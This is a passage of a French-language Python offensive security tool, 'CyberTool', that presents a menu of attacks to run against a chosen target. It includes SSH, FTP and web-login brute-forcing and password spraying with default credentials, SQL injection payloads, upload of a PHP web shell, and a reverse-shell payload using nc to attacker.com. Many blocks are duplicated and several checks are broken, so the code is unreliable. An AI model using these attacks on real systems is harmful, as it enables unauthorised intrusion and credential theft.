                url = f"http://{self.target}/config.json"
                response = requests.get(url)
                if "api_key" in response.text or "password" in response.text:
                    self.console.print("[âš ï¸] DonnÃ©es sensibles trouvÃ©es !", style="bold yellow")

            elif feature == "user_enum":
                self.console.print("[ğŸ‘¤] Ã‰numÃ©ration d'utilisateurs en cours...")
                users = ["admin", "guest", "developer"]
                for user in users:
                    url = f"http://{self.target}/login?username={user}"
                    response = requests.get(url)
                    if "user exists" in response.text:
                        self.console.print(f"[âœ…] Utilisateur trouvÃ© : {user}", style="bold green")

            elif feature == "php_eval_detection":
                self.console.print("[ğŸ–¥ï¸] DÃ©tection d'exÃ©cution de code PHP...")
                url = f"http://{self.target}/eval.php?cmd=phpinfo()"
                response = requests.get(url)
                if "PHP Version" in response.text:
                    self.console.print("[âš ï¸] Code PHP exÃ©cutable dÃ©tectÃ© !", style="bold yellow")

            elif feature == "hidden_service_finder":
                self.console.print("[ğŸ”] Recherche de services cachÃ©s...")
                url = f"http://{self.target}/.hidden/"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Service cachÃ© dÃ©tectÃ© !", style="bold green")

            elif feature == "iot_vulnerability_scan":
                self.console.print("[ğŸ”] Scan de vulnÃ©rabilitÃ©s IoT...")
                url = f"http://{self.target}/iot/status"
                response = requests.get(url)
                if "vulnerable" in response.text:
                    self.console.print("[âš ï¸] Appareil IoT vulnÃ©rable dÃ©tectÃ© !", style="bold yellow")

            elif feature == "tls_analysis":
                self.console.print("[ğŸ”] Analyse TLS et certificats en cours...")
                url = f"https://{self.target}"
                response = requests.get(url)
                if "TLS" in response.text:
                    self.console.print("[âœ…] Analyse TLS complÃ¨te !", style="bold green")

            elif feature == "dns_takeover_test":
                self.console.print("[ğŸŒ] Test de prise de contrÃ´le DNS...")
                url = f"http://{self.target}/dns_test"
                response = requests.get(url)
                if "DNS vulnerable" in response.text:
                    self.console.print("[âš ï¸] Risque de takeover DNS dÃ©tectÃ© !", style="bold yellow")

            elif feature == "cloudflare_bypass":
                self.console.print("[â˜ï¸] Test de contournement Cloudflare...")
                url = f"http://{self.target}/real-ip"
                response = requests.get(url)
                if "origin IP" in response.text:
                    self.console.print("[âœ…] Contournement Cloudflare rÃ©ussi !", style="bold green")

            elif feature == "websocket_scan":
                self.console.print("[ğŸ”—] Scan des WebSockets en cours...")
                url = f"ws://{self.target}/ws"
                response = requests.get(url)
                if response.status_code == 101:
                    self.console.print("[âœ…] WebSocket dÃ©tectÃ© !", style="bold green")

            elif feature == "web_fingerprint":
                self.console.print("[ğŸ–¥ï¸] Fingerprinting Web en cours...")
                url = f"http://{self.target}/fingerprint"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Technologies dÃ©tectÃ©es !", style="bold green")

            elif feature == "cdn_detection":
                self.console.print("[ğŸ“¡] DÃ©tection de CDN en cours...")
                url = f"http://{self.target}/cdn-check"
                response = requests.get(url)
                if "CDN detected" in response.text:
                    self.console.print("[âœ…] CDN en usage !", style="bold green")

            elif feature == "ssh_bruteforce":
                self.console.print("[ğŸ”‘] Bruteforce SSH en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ssh_bruteforce(self.target, user, pwd):
                        self.console.print(f"[âœ…] AccÃ¨s SSH obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "ftp_bruteforce":
                self.console.print("[ğŸ”‘] Bruteforce FTP en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ftp_bruteforce(self.target, user, pwd):
                        self.console.print(f"[âœ…] AccÃ¨s FTP obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "smb_enum":
                self.console.print("[ğŸ“‚] Ã‰numÃ©ration SMB en cours...")
                url = f"smb://{self.target}"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Partages SMB dÃ©tectÃ©s !", style="bold green")

            elif feature == "docker_registry_scan":
                self.console.print("[ğŸ³] Scan du registre Docker en cours...")
                url = f"http://{self.target}:5000/v2/_catalog"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Registre Docker accessible !", style="bold green")

            elif feature == "kubernetes_enum":
                self.console.print("[â˜¸ï¸] Ã‰numÃ©ration Kubernetes en cours...")
                url = f"http://{self.target}:8001/api/v1/namespaces"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] API Kubernetes accessible !", style="bold green")

            elif feature == "file_upload_test":
                self.console.print("[ğŸ“‚] Test de tÃ©lÃ©chargement de fichiers en cours...")
                url = f"http://{self.target}/upload.php"
                files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
                response = requests.post(url, files=files)
                if response.status_code == 200:
                    self.console.print("[âš ï¸] Upload de fichier PHP possible !", style="bold yellow")

            elif feature == "reverse_shell_check":
                self.console.print("[ğŸ”] VÃ©rification de Reverse Shell...")
                url = f"http://{self.target}/shell.php?cmd=id"
                response = requests.get(url)
                if "uid=" in response.text:
                    self.console.print("[âš ï¸] Reverse Shell actif !", style="bold yellow")

            elif feature == "password_spray":
                self.console.print("[ğŸ”“] Test de Password Spraying...")
                users = ["admin", "root", "user"]
                passwords = ["password", "123456", "admin"]
                for user in users:
                    for pwd in passwords:
                        url = f"http://{self.target}/login"
                        response = requests.post(url, data={"username": user, "password": pwd})
                        if "Welcome" in response.text:
                            self.console.print(f"[âœ…] AccÃ¨s obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "waf_detection":
                self.console.print("[ğŸ›¡ï¸] DÃ©tection de Web Application Firewall...")
                url = f"http://{self.target}"
                headers = {"User-Agent": "WAF-Scanner"}
                response = requests.get(url, headers=headers)
                if "403 Forbidden" in response.text:
                    self.console.print("[âš ï¸] WAF dÃ©tectÃ© sur la cible !", style="bold yellow")

            elif feature == "api_rate_limit_test":
                self.console.print("[ğŸ”„] Test de limitations d'API en cours...")
                url = f"http://{self.target}/api/v1/test"
                for _ in range(10):
                    response = requests.get(url)
                    if response.status_code == 429:
                        self.console.print("[âš ï¸] Limite de requÃªtes API atteinte !", style="bold yellow")
                        break

            elif feature == "websocket_scan":
                self.console.print("[ğŸ”—] Scan des WebSockets en cours...")
                url = f"ws://{self.target}/ws"
                response = requests.get(url)
                if response.status_code == 101:
                    self.console.print("[âœ…] WebSocket dÃ©tectÃ© !", style="bold green")

            elif feature == "web_fingerprint":
                self.console.print("[ğŸ–¥ï¸] Fingerprinting Web en cours...")
                url = f"http://{self.target}/fingerprint"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Technologies dÃ©tectÃ©es !", style="bold green")

            elif feature == "cdn_detection":
                self.console.print("[ğŸ“¡] DÃ©tection de CDN en cours...")
                url = f"http://{self.target}/cdn-check"
                response = requests.get(url)
                if "CDN detected" in response.text:
                    self.console.print("[âœ…] CDN en usage !", style="bold green")

            elif feature == "ssh_bruteforce":
                self.console.print("[ğŸ”‘] Bruteforce SSH en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ssh_bruteforce(self.target, user, pwd):
                        self.console.print(f"[âœ…] AccÃ¨s SSH obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "ftp_bruteforce":
                self.console.print("[ğŸ”‘] Bruteforce FTP en cours...")
                attempts = ["admin:admin", "root:toor", "user:password"]
                for attempt in attempts:
                    user, pwd = attempt.split(":")
                    if ftp_bruteforce(self.target, user, pwd):
                        self.console.print(f"[âœ…] AccÃ¨s FTP obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "smb_enum":
                self.console.print("[ğŸ“‚] Ã‰numÃ©ration SMB en cours...")
                url = f"smb://{self.target}"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Partages SMB dÃ©tectÃ©s !", style="bold green")

            elif feature == "docker_registry_scan":
                self.console.print("[ğŸ³] Scan du registre Docker en cours...")
                url = f"http://{self.target}:5000/v2/_catalog"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Registre Docker accessible !", style="bold green")

            elif feature == "kubernetes_enum":
                self.console.print("[â˜¸ï¸] Ã‰numÃ©ration Kubernetes en cours...")
                url = f"http://{self.target}:8001/api/v1/namespaces"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] API Kubernetes accessible !", style="bold green")

            elif feature == "file_upload_test":
                self.console.print("[ğŸ“‚] Test de tÃ©lÃ©chargement de fichiers en cours...")
                url = f"http://{self.target}/upload.php"
                files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
                response = requests.post(url, files=files)
                if response.status_code == 200:
                    self.console.print("[âš ï¸] Upload de fichier PHP possible !", style="bold yellow")

            elif feature == "reverse_shell_check":
                self.console.print("[ğŸ”] VÃ©rification de Reverse Shell...")
                url = f"http://{self.target}/shell.php?cmd=id"
                response = requests.get(url)
                if "uid=" in response.text:
                    self.console.print("[âš ï¸] Reverse Shell actif !", style="bold yellow")

            elif feature == "password_spray":
                self.console.print("[ğŸ”“] Test de Password Spraying...")
                users = ["admin", "root", "user"]
                passwords = ["password", "123456", "admin"]
                for user in users:
                    for pwd in passwords:
                        url = f"http://{self.target}/login"
                        response = requests.post(url, data={"username": user, "password": pwd})
                        if "Welcome" in response.text:
                            self.console.print(f"[âœ…] AccÃ¨s obtenu avec {user}:{pwd}", style="bold green")

            elif feature == "waf_detection":
                self.console.print("[ğŸ›¡ï¸] DÃ©tection de Web Application Firewall...")
                url = f"http://{self.target}"
                headers = {"User-Agent": "WAF-Scanner"}
                response = requests.get(url, headers=headers)
                if "403 Forbidden" in response.text:
                    self.console.print("[âš ï¸] WAF dÃ©tectÃ© sur la cible !", style="bold yellow")

            elif feature == "api_rate_limit_test":
                self.console.print("[ğŸ”„] Test de limitations d'API en cours...")
                url = f"http://{self.target}/api/v1/test"
                for _ in range(10):
                    response = requests.get(url)
                    if response.status_code == 429:
                        self.console.print("[âš ï¸] Limite de requÃªtes API atteinte !", style="bold yellow")
                        break

        self.console.print(
            f"\n[ğŸ’€] Bienvenue sur CyberTool - Cible : [bold cyan]{self.target}[/bold cyan]",
            style="bold red"
        )

        self.display_features_table()  # âœ… Affichage propre du tableau interactif

        while True:
            choice = Prompt.ask("\n[ğŸ› ï¸] Entrez un numÃ©ro (1-100) ou 'valider' pour exÃ©cuter")

            if choice.lower() == "valider":
                break

            try:
                idx = int(choice) - 1
                if 0 <= idx < len(self.feature_map):
                    feature_key = list(self.feature_map.keys())[idx]
                    if feature_key not in self.selected_features:
                        self.selected_features.append(feature_key)
                        self.console.print(f"[âœ…] AjoutÃ© : {self.feature_map[feature_key]}", style="bold green")
                    else:
                        self.console.print(f"[âš ï¸] DÃ©jÃ  sÃ©lectionnÃ© : {self.feature_map[feature_key]}", style="bold yellow")
                else:
                    self.console.print("[âŒ] NumÃ©ro invalide !", style="bold red")
            except ValueError:
                self.console.print("[âŒ] EntrÃ©e invalide !", style="bold red")

        self.console.print(f"\n[ğŸ”¥] ExÃ©cution des tests sur : [bold cyan]{self.target}[/bold cyan]")

        for feature in self.selected_features:
            self.console.print(f"[ğŸ”] ExÃ©cution de : {self.feature_map[feature]}")

            # VÃ©rification si la fonctionnalitÃ© a une version interactive
            if feature in self.feature_map_interactive:
                self.console.print("[âš¡] Version interactive dÃ©tectÃ©e, lancement en mode interactif...", style="bold yellow")
                self.feature_map_interactive[feature](self.target)
            else:
                # ExÃ©cution standard si pas de version interactive
                if feature == "dns_lookup":
                    self.console.print("[ğŸ”] Recherche DNS en cours...")
                    try:
                        ip = socket.gethostbyname(self.target)
                        self.console.print(f"[ğŸŸ¢] {self.target} â†’ {ip}", style="bold green")
                    except socket.gaierror:
                        self.console.print("[âŒ] Ã‰chec de la rÃ©solution DNS.", style="bold red")

                elif feature == "port_scan":
                    self.console.print("[ğŸ”] Scan des ports en cours...")
                    open_ports = []
                    for port in [21, 22, 25, 53, 80, 443, 8080]:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(1)
                            if s.connect_ex((self.target, port)) == 0:
                                open_ports.append(port)
                    self.console.print(f"[âœ…] Ports ouverts : {', '.join(map(str, open_ports)) if open_ports else 'Aucun'}", style="bold green")

                # Ajoute ici la suite des fonctionnalitÃ©s normales (dÃ©jÃ  intÃ©grÃ©es)








    def display_features_table(self):
        """ğŸ“Š Affichage interactif des fonctionnalitÃ©s sous forme de tableau"""

        table = Table(title="ğŸ› ï¸ CyberTool - FonctionnalitÃ©s Disponibles", style="bold cyan")

        table.add_column("#", justify="center", style="bold white", no_wrap=True)
        table.add_column("Nom de la FonctionnalitÃ©", style="bold magenta")
        table.add_column("Mode", style="bold yellow")

        for idx, (feature, description) in enumerate(self.feature_map.items(), start=1):
            mode = "[âš¡] Interactive" if feature in self.feature_map_interactive else "[ğŸ› ï¸] Standard"
            table.add_row(str(idx), description, mode)

        self.console.print(table)

    def generate_file_name(self, category="cybertool", extension="txt"):
        """ğŸ“‚ GÃ©nÃ©ration d'un nom de fichier unique basÃ© sur la catÃ©gorie"""
        random_suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{category}_{random_suffix}.{extension}"

    def save_results_to_file(self, filename, data):
        """ğŸ“‚ Sauvegarde les rÃ©sultats dans un fichier"""
        with open(filename, "w", encoding="utf-8") as file:
            file.write(data)

    def get_http_response(self, url):
        """ğŸŒ RÃ©cupÃ¨re la rÃ©ponse HTTP d'une URL"""
        try:
            response = requests.get(url, timeout=5)
            return response.status_code, response.text[:500]  # ğŸ”¹ Retourne le code + extrait des 500 1ers caractÃ¨res
        except requests.exceptions.RequestException as e:
            return None, f"Erreur lors de la requÃªte : {e}"

    def add_result(self, feature, result):
        """ğŸ“ Ajoute un rÃ©sultat au stockage global"""
        if not hasattr(self, "results"):
            self.results = {}  # ğŸ“Œ Initialise le stockage s'il n'existe pas

        self.results[feature] = result
        self.console.print(f"[ğŸ’¾] RÃ©sultat ajoutÃ© pour {feature} !", style="bold cyan")













#50 50 50 50





# âœ… TOP : Fonctions 1 Ã  5
def dns_lookup(domain):
    """ RÃ©solution DNS """
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return "RÃ©solution DNS impossible."

def port_scan(ip, ports=[21, 22, 80, 443, 3306]):
    """ Scan des ports basiques """
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        if sock.connect_ex((ip, port)) == 0:
            open_ports.append(port)
        sock.close()
    return open_ports if open_ports else "Aucun port ouvert dÃ©tectÃ©."

def headers_analysis(url):
    """ Analyse des headers HTTP """
    try:
        response = requests.get(url, timeout=5)
        return response.headers
    except Exception as e:
        return f"Erreur : {e}"

def directory_bruteforce(url, wordlist=["admin", "login", "dashboard"]):
    """ Brute-force de rÃ©pertoires """
    found = []
    for word in wordlist:
        full_url = f"{url}/{word}"
        response = requests.get(full_url)
        if response.status_code == 200:
            found.append(full_url)
    return found if found else "Aucun rÃ©pertoire trouvÃ©."

def cms_detector(url):
    """ DÃ©tection CMS """
    try:
        response = requests.get(url, timeout=5)
        if "wp-content" in response.text:
            return "WordPress dÃ©tectÃ©."
        elif "Joomla" in response.text:
            return "Joomla dÃ©tectÃ©."
        elif "Drupal" in response.text:
            return "Drupal dÃ©tectÃ©."
        else:
            return "CMS non dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"




# âœ… TOP : Fonctions 6 Ã  10
def subdomain_enum(domain):
    """ Ã‰numÃ©ration des sous-domaines """
    url = f"https://crt.sh/?q={domain}&output=json"
    try:
        response = requests.get(url, timeout=5)
        return [entry["name_value"] for entry in response.json()]
    except Exception as e:
        return f"Erreur : {e}"

def sql_injection_test(url):
    """ Test d'injection SQL """
    payload = "' OR '1'='1"
    try:
        response = requests.get(f"{url}{payload}", timeout=5)
        return "Possible vulnÃ©rabilitÃ© SQL dÃ©tectÃ©e" if "error" in response.text.lower() else "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def ftp_bruteforce(ip, username, password):
    """ Bruteforce FTP """
    from ftplib import FTP
    try:
        ftp = FTP(ip)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return "Connexion FTP rÃ©ussie !"
    except Exception as e:
        return f"Ã‰chec FTP : {e}"

def smb_enum(ip):
    """ Ã‰numÃ©ration SMB """
    try:
        response = subprocess.run(["smbclient", "-L", ip, "-N"], capture_output=True, text=True, timeout=5)
        return response.stdout if response.stdout else "Aucune information SMB trouvÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def honeypot_detection(ip):
    """ DÃ©tection de Honeypot """
    try:
        response = requests.get(f"http://api.shodan.io/shodan/host/{ip}?key=YourShodanAPIKey", timeout=5)
        return "Honeypot dÃ©tectÃ© !" if "honeypot" in response.json() else "Aucun Honeypot dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"




# âœ… TOP : Fonctions 11 Ã  15
def open_redirect_test(url):
    """ DÃ©tection d'Open Redirect """
    payload = "/redirect?url=https://evil.com"
    try:
        response = requests.get(url + payload, allow_redirects=False, timeout=5)
        return "VulnÃ©rabilitÃ© Open Redirect dÃ©tectÃ©e !" if response.status_code in [301, 302] else "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def web_fingerprint(url):
    """ Fingerprinting Web """
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        techs = []
        if "server" in headers:
            techs.append(headers["server"])
        if "x-powered-by" in headers:
            techs.append(headers["x-powered-by"])
        return techs if techs else "Aucune info dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def docker_registry_scan(ip):
    """ Scan d'un registre Docker exposÃ© """
    try:
        response = requests.get(f"http://{ip}:5000/v2/_catalog", timeout=5)
        return response.json() if response.status_code == 200 else "Aucun registre Docker exposÃ© dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"

def file_upload_test(url):
    """ Test de vulnÃ©rabilitÃ© upload de fichier """
    files = {"file": ("test.txt", "Vulnerability test", "text/plain")}
    try:
        response = requests.post(url, files=files, timeout=5)
        return "Upload rÃ©ussi, vulnÃ©rabilitÃ© possible !" if response.status_code == 200 else "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def browser_fingerprint():
    """ Fingerprinting du navigateur """
    try:
        response = requests.get("https://www.whatismybrowser.com/api/v2/user_agent_parse", timeout=5)
        return response.json() if response.status_code == 200 else "Impossible de rÃ©cupÃ©rer les infos du navigateur."
    except Exception as e:
        return f"Erreur : {e}"




# âœ… TOP : Fonctions 16 Ã  20
def api_rate_limit_test(url):
    """ Test des limitations de requÃªtes dâ€™une API """
    try:
        for _ in range(10):
            response = requests.get(url, timeout=5)
        return "Aucune limitation dÃ©tectÃ©e." if response.status_code == 200 else "Limite API atteinte !"
    except Exception as e:
        return f"Erreur : {e}"

def reverse_shell_check(url):
    """ VÃ©rification de prÃ©sence dâ€™un Reverse Shell """
    payload = "; nc -e /bin/sh attacker.com 4444"
    try:
        response = requests.get(f"{url}{payload}", timeout=5)
        return "Reverse shell potentiellement possible !" if response.status_code == 200 else "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def password_spray(url, user_list, password):
    """ Attaque de Password Spraying """
    valid_users = []
    for user in user_list:
        try:
            response = requests.post(url, data={"username": user, "password": password}, timeout=5)
            if response.status_code == 200:
                valid_users.append(user)
        except:
            pass
    return valid_users if valid_users else "Aucun utilisateur trouvÃ© avec ce mot de passe."

def waf_detection(url):
    """ DÃ©tection d'un Web Application Firewall (WAF) """
    headers = {"User-Agent": "BadBot"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        return "WAF dÃ©tectÃ© !" if response.status_code in [403, 406] else "Aucun WAF dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"

def tls_analysis(domain):
    """ Analyse TLS et certificats SSL """
    try:
        import ssl
        cert = ssl.get_server_certificate((domain, 443))
        return cert if cert else "Aucune information sur le certificat trouvÃ©e."
    except Exception as e:
        return f"Erreur : {e}"




# âœ… TOP : Fonctions 21 Ã  25
def jwt_analysis(token):
    """ Analyse et dÃ©codage JWT """
    try:
        import jwt
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except Exception as e:
        return f"Erreur : {e}"

def cdn_detection(domain):
    """ DÃ©tection de l'utilisation d'un CDN """
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=5)
        if "cloudflare" in response.text.lower():
            return "CDN dÃ©tectÃ© : Cloudflare"
        return "Aucun CDN dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"

def metadata_extraction(file_path):
    """ Extraction des mÃ©tadonnÃ©es dâ€™un fichier """
    try:
        from exif import Image
        with open(file_path, "rb") as file:
            img = Image(file)
            return img.list_all() if img.has_exif else "Aucune mÃ©tadonnÃ©e trouvÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def email_enum(domain):
    """ Ã‰numÃ©ration des e-mails exposÃ©s via Hunter.io """
    api_key = "YourHunterAPIKey"
    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
    try:
        response = requests.get(url, timeout=5)
        return response.json().get("data", {}).get("emails", "Aucun e-mail trouvÃ©.")
    except Exception as e:
        return f"Erreur : {e}"

def websocket_scan(url):
    """ Analyse des WebSockets """
    try:
        import websocket
        ws = websocket.create_connection(url, timeout=5)
        ws.send("ping")
        response = ws.recv()
        ws.close()
        return f"RÃ©ponse WebSocket : {response}"
    except Exception as e:
        return f"Erreur : {e}"



# âœ… TOP : Fonctions 26 Ã  30
def id_oracle_attack(url):
    """ DÃ©tection de vulnÃ©rabilitÃ©s ID Oracle """
    payloads = ["1' OR '1'='1", "1' OR '1'='1' -- ", "1' OR '1'='1' #"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=5)
            if "error" in response.text.lower():
                results.append(payload)
        except:
            pass
    return results if results else "Aucune vulnÃ©rabilitÃ© ID Oracle dÃ©tectÃ©e."

def hidden_service_finder():
    """ DÃ©tection de services cachÃ©s sur Ahmia """
    url = "https://ahmia.fi/hidden_service/"
    try:
        response = requests.get(url, timeout=5)
        return response.json() if response.status_code == 200 else "Impossible dâ€™obtenir les services cachÃ©s."
    except Exception as e:
        return f"Erreur : {e}"

def cloudflare_bypass(domain):
    """ Test de contournement Cloudflare """
    try:
        response = requests.get(f"http://{domain}", headers={"CF-Connecting-IP": "1.1.1.1"}, timeout=5)
        return "Cloudflare potentiellement contournÃ© !" if response.status_code == 200 else "Cloudflare en place."
    except Exception as e:
        return f"Erreur : {e}"

def dns_takeover_test(domain):
    """ Test de prise de contrÃ´le DNS """
    try:
        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=5)
        return response.text if response.status_code == 200 else "Impossible d'obtenir les informations DNS."
    except Exception as e:
        return f"Erreur : {e}"

def network_traffic_analysis():
    """ Analyse du trafic rÃ©seau """
    try:
        import scapy.all as scapy
        packets = scapy.sniff(count=10)
        return packets.summary()
    except Exception as e:
        return f"Erreur : {e}"



# âœ… TOP : Fonctions 31 Ã  35
def ssh_bruteforce(ip, username, password):
    """ Bruteforce SSH sans Paramiko (via pexpect) """
    try:
        ssh_command = f"ssh {username}@{ip}"
        child = pexpect.spawn(ssh_command, timeout=5)
        child.expect("password:")
        child.sendline(password)
        child.expect(["$", ">", "#"])  # âœ… GÃ¨re diffÃ©rents prompts
        return "Connexion SSH rÃ©ussie !"
    except Exception as e:
        return f"Ã‰chec SSH : {e}"

def web_fingerprint(url):
    """ Fingerprinting Web (Technos utilisÃ©es) """
    try:
        response = requests.get(url, timeout=5)
        headers = response.headers
        techs = []
        if "server" in headers:
            techs.append(headers["server"])
        if "x-powered-by" in headers:
            techs.append(headers["x-powered-by"])
        return techs if techs else "Aucune info dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def password_spray(url, user_list, password):
    """ Attaque de Password Spraying """
    valid_users = []
    for user in user_list:
        try:
            response = requests.post(url, data={"username": user, "password": password}, timeout=5)
            if response.status_code == 200:
                valid_users.append(user)
        except:
            pass
    return valid_users if valid_users else "Aucun utilisateur trouvÃ© avec ce mot de passe."

def forensics_analysis(file_path):
    """ Analyse forensique avancÃ©e d'un fichier """
    try:
        import hashlib
        hash_sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return {"sha256": hash_sha256.hexdigest()}
    except Exception as e:
        return f"Erreur : {e}"

def docker_registry_scan(ip):
    """ Scan d'un registre Docker exposÃ© """
    try:
        response = requests.get(f"http://{ip}:5000/v2/_catalog", timeout=5)
        return response.json() if response.status_code == 200 else "Aucun registre Docker exposÃ© dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"


# âœ… TOP : Fonctions 36 Ã  40
def iot_vulnerability_scan(ip):
    """ Scan de vulnÃ©rabilitÃ©s IoT via Shodan """
    api_key = "YourShodanAPIKey"
    url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
    try:
        response = requests.get(url, timeout=5)
        return response.json() if response.status_code == 200 else "Aucune vulnÃ©rabilitÃ© IoT dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def file_upload_test(url):
    """ Test de vulnÃ©rabilitÃ© upload de fichier """
    files = {"file": ("test.txt", "Vulnerability test", "text/plain")}
    try:
        response = requests.post(url, files=files, timeout=5)
        return "Upload rÃ©ussi, vulnÃ©rabilitÃ© possible !" if response.status_code == 200 else "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def cloudflare_bypass(domain):
    """ Contournement Cloudflare potentiel """
    try:
        response = requests.get(f"http://{domain}", headers={"CF-Connecting-IP": "1.1.1.1"}, timeout=5)
        return "Cloudflare potentiellement contournÃ© !" if response.status_code == 200 else "Cloudflare en place."
    except Exception as e:
        return f"Erreur : {e}"

def network_traffic_analysis():
    """ Analyse du trafic rÃ©seau """
    try:
        import scapy.all as scapy
        packets = scapy.sniff(count=10)
        return packets.summary()
    except Exception as e:
        return f"Erreur : {e}"

def jwt_analysis(token):
    """ Analyse et dÃ©codage JWT """
    try:
        import jwt
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except Exception as e:
        return f"Erreur : {e}"




# âœ… TOP : Fonctions 41 Ã  45
def kubernetes_enum(ip):
    """ Ã‰numÃ©ration des services Kubernetes """
    try:
        response = requests.get(f"http://{ip}:8080/api/v1/namespaces/default/pods", timeout=5)
        return response.json() if response.status_code == 200 else "Aucun service Kubernetes dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"

def tls_analysis(domain):
    """ Analyse TLS et certificats SSL """
    try:
        import ssl
        cert = ssl.get_server_certificate((domain, 443))
        return cert if cert else "Aucune information sur le certificat trouvÃ©e."
    except Exception as e:
        return f"Erreur : {e}"

def browser_fingerprint():
    """ Fingerprinting d'un navigateur """
    try:
        response = requests.get("https://www.whatismybrowser.com/api/v2/user_agent_parse", timeout=5)
        return response.json() if response.status_code == 200 else "Impossible de rÃ©cupÃ©rer les infos du navigateur."
    except Exception as e:
        return f"Erreur : {e}"

def email_enum(domain):
    """ Ã‰numÃ©ration d'adresses e-mails exposÃ©es via Hunter.io """
    api_key = "YourHunterAPIKey"
    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
    try:
        response = requests.get(url, timeout=5)
        return response.json().get("data", {}).get("emails", "Aucun e-mail trouvÃ©.")
    except Exception as e:
        return f"Erreur : {e}"

def metadata_extraction(file_path):
    """ Extraction de mÃ©tadonnÃ©es d'un fichier """
    try:
        from exif import Image
        with open(file_path, "rb") as file:
            img = Image(file)
            return img.list_all() if img.has_exif else "Aucune mÃ©tadonnÃ©e trouvÃ©e."
    except Exception as e:
        return f"Erreur : {e}"




# âœ… TOP : Fonctions 46 Ã  50
def websocket_scan(url):
    """ Analyse des WebSockets """
    try:
        import websocket
        ws = websocket.create_connection(url, timeout=5)
        ws.send("ping")
        response = ws.recv()
        ws.close()
        return f"RÃ©ponse WebSocket : {response}"
    except Exception as e:
        return f"Erreur : {e}"

def advanced_forensics(file_path):
    """ Analyse forensique avancÃ©e d'un fichier """
    try:
        import hashlib
        hash_sha256 = hashlib.sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return {"sha256": hash_sha256.hexdigest()}
    except Exception as e:
        return f"Erreur : {e}"

def waf_detection(url):
    """ DÃ©tection d'un Web Application Firewall (WAF) """
    headers = {"User-Agent": "BadBot"}
    try:
        response = requests.get(url, headers=headers, timeout=5)
        return "WAF dÃ©tectÃ© !" if response.status_code in [403, 406] else "Aucun WAF dÃ©tectÃ©."
    except Exception as e:
        return f"Erreur : {e}"










# âœ… TOP : Interaction dynamique avec les 50 fonctionnalitÃ©s de base

def interactive_dns_lookup(target):
    """ RÃ©solution DNS avec option d'enchaÃ®nement vers d'autres scans """
    domain = input("ğŸ” Entrez un domaine Ã  analyser : ")
    result = dns_lookup(domain)
    print(f"âœ… RÃ©sultat : {result}")
    
    if isinstance(result, str) and "RÃ©solution DNS impossible" in result:
        return  # Stop ici si Ã©chec
    
    next_action = input("âš¡ Voulez-vous scanner les ports de cette IP ? (y/n) ").lower()
    if next_action == "y":
        print(f"ğŸš€ Lancement du scan des ports sur {result}...")
